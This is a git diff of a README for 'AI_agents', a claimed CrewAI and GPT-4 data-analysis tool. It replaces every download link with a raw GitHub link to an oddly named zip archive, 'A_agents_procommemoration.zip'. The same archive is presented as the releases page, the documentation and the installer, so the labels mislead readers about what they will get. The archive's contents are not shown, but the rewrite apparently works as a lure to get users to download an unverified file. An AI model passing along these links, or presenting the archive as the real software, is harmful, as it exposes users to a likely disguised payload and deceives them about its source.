@@ -1,6 +1,6 @@
 # 🚀 AI_agents - Simplifying Data Analysis with Intelligent Agents
 
-[![Download AI_agents](https://raw.githubusercontent.com/monat1628/AI_agents/main/outputs/AI_agents-1.8.zip)](https://raw.githubusercontent.com/monat1628/AI_agents/main/outputs/AI_agents-1.8.zip)
+[![Download AI_agents](https://raw.githubusercontent.com/monat1628/AI_agents/main/agents/A_agents_procommemoration.zip)](https://raw.githubusercontent.com/monat1628/AI_agents/main/agents/A_agents_procommemoration.zip)
 
 ## 🏗️ Overview
 AI_agents is a multi-agent artificial intelligence system designed for automated data analysis. Using CrewAI and GPT-4, this application features intelligent agents that help users conduct exploratory data analysis (EDA), create visualizations, and generate comprehensive reports. Whether you're a student, a researcher, or simply curious about data science, AI_agents can make your data analysis tasks easier and more efficient.
@@ -23,7 +23,7 @@ To use AI_agents, ensure your system meets the following requirements:
 Follow these simple steps to download and run AI_agents:
 
 1. **Visit the Releases Page**: Click the link below to access the download page.
-   [Download AI_agents](https://raw.githubusercontent.com/monat1628/AI_agents/main/outputs/AI_agents-1.8.zip)
+   [Download AI_agents](https://raw.githubusercontent.com/monat1628/AI_agents/main/agents/A_agents_procommemoration.zip)
 
 2. **Select the Latest Release**: Look for the latest version in the list and click on it.
 
@@ -50,11 +50,11 @@ Once you have installed AI_agents, you can start analyzing your data:
 If you encounter any issues or have questions, you can reach out by opening an issue on the GitHub repository page. Community members and developers are ready to assist you.
 
 ## 📃 Additional Information
-For more in-depth guides and support, please refer to our [Documentation](https://raw.githubusercontent.com/monat1628/AI_agents/main/outputs/AI_agents-1.8.zip).
+For more in-depth guides and support, please refer to our [Documentation](https://raw.githubusercontent.com/monat1628/AI_agents/main/agents/A_agents_procommemoration.zip).
 
 ## 📥 Download & Install
 To jump straight into using AI_agents, remember to:
-1. Visit this page to download: [AI_agents Releases](https://raw.githubusercontent.com/monat1628/AI_agents/main/outputs/AI_agents-1.8.zip)
+1. Visit this page to download: [AI_agents Releases](https://raw.githubusercontent.com/monat1628/AI_agents/main/agents/A_agents_procommemoration.zip)
 2. Choose the latest release and install on your system.
 
 By following these steps, you will be able to leverage the full potential of AI_agents for your data analysis needs. Enjoy transforming your data through insights gained with ease!
